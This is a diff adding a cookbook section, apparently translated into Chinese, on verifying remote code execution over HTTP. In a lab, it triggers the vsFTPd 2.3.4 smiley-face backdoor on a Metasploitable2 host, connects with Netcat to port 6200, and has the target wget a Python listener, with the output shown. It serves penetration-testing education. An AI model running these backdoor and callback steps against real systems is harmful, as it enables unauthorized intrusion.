@@ -469,3 +469,89 @@ Scanning '172.16.36.225'...
 ### 工作原理
 
 大多数漏洞扫描程序会通过评估多个不同的响应来尝试确定系统是否容易受特定攻击。 一些情况下，漏洞扫描可以简化为与远程服务建立TCP连接并且通过自我公开的特征，识别已知的漏洞版本。 在其他情况下，可以向远程服务发送一系列复杂的特定的探测请求，来试图请求对服务唯一的响应，该服务易受特定的攻击。Nessuscmd执行相同的测试，或者由常规Nessus接口，给定一个特定的插件ID来执行。 唯一的区别是执行漏洞扫描的方式。
+
+## 5.6 使用 HTTP 交互来验证漏洞
+
+作为渗透测试者，任何给定漏洞的最佳结果是实现远程代码执行。 但是，在某些情况下，我们可能只想确定远程代码执行漏洞是否可利用，但不想实际遵循整个利用和后续利用过程。 执行此操作的一种方法是创建一个Web服务器，该服务器将记录交互并使用给定的利用来执行将代码，使远程主机与Web服务器交互。 此秘籍战死了如何编写自定义脚本，用于使用HTTP流量验证远程代码执行漏洞。
+
+### 准备
+
+要使用HTTP交互验证漏洞，你需要一个运行拥有远程代码执行漏洞的软件的系统。 此外，本节需要使用文本编辑器（如VIM或Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM和Nano）”秘籍。
+
+### 操作步骤
+
+在实际利用给定的漏洞之前，我们必须部署一个Web服务器，它会记录与它的交互。 这可以通过一个简单的Python脚本来完成，如下所示：
+
+```py
+#!/usr/bin/python
+
+import socket
+
+print "Awaiting connection...\n"
+
+httprecv = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+httprecv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+httprecv.bind(("0.0.0.0",8000)) 
+httprecv.listen(2)
+
+(client, ( ip,sock)) = httprecv.accept() 
+print "Received connection from : ", ip 
+data = client.recv(4096) 
+print str(data)
+
+client.close() 
+httprecv.close()
+```
+
+这个Python脚本使用套接字库来生成一个Web服务器，该服务器监听所有本地接口的TCP 8000 端口。 接收到来自客户端的连接时，脚本将返回客户端的IP地址和发送的请求。 为了使用此脚本验证漏洞，我们需要执行代码，使远程系统与托管的Web服务进行交互。 但在这之前，我们需要使用以下命令启动我们的脚本：
+
+```
+root@KaliLinux:~# ./httprecv.py 
+Awaiting connection... 
+```
+
+接下来，我们需要利用导致远程代码执行的漏洞。 通过检查Metasploitable2盒子内的Nessus扫描结果，我们可以看到运行的FTP服务有一个后门，可以通过提供带有笑脸的用户名来触发。 没有开玩笑......这实际上包含在 FTP 生产服务中。 为了尝试利用它，我们将首先使用适当的用户名连接到服务，如下所示：
+
+```
+root@KaliLinux:~# ftp 172.16.36.135 21 
+Connected to 172.16.36.135. 
+220 (vsFTPd 2.3.4) 
+Name (172.16.36.135:root): Hutch:) 
+331 Please specify the password. 
+Password: 
+^C 
+421 Service not available, remote server has closed connection 
+```
+
+尝试连接到包含笑脸的用户名后，后门应该在远程主机的TCP端口6200上打开。我们甚至不需要输入密码。 反之，`Ctrl + C`可用于退出FTP客户端，然后可以使用Netcat连接到打开的后门，如下所示：
+
+```
+root@KaliLinux:~# nc 172.16.36.135 6200 
+wget http://172.16.36.224:8000 
+--04:18:18--  http://172.16.36.224:8000/
+           => `index.html' 
+Connecting to 172.16.36.224:8000... connected. 
+HTTP request sent, awaiting response... No data received. 
+Retrying.
+
+--04:18:19--  http://172.16.36.224:8000/  
+  (try: 2) => `index.html' 
+Connecting to 172.16.36.224:8000... failed: Connection refused. 
+^C
+```
+
+与开放端口建立TCP连接后，我们可以使用我们的脚本来验证，我们是否可以进行远程代码执行。 为此，我们尝试以 HTTP 检测服务器的 URL 使用`wget`。 尝试执行此代码后，我们可以通过查看脚本输出来验证是否收到了HTTP请求：
+
+```
+root@KaliLinux:~# ./httprecv.py 
+Received connection from :  172.16.36.135 
+GET / HTTP/1.0 
+User-Agent: Wget/1.10.2 
+Accept: */* 
+Host: 172.16.36.224:8000 
+Connection: Keep-Alive
+```
+
+### 工作原理
+
+此脚本的原理是识别来自远程主机的连接尝试。 执行代码会导致远程系统连接回我们的监听服务器，我们可以通过利用特定的漏洞来验证远程代码执行是否存在。 在远程服务器未安装`wget`或`curl`的情况下，可能需要采用另一种手段来识别远程代码执行。
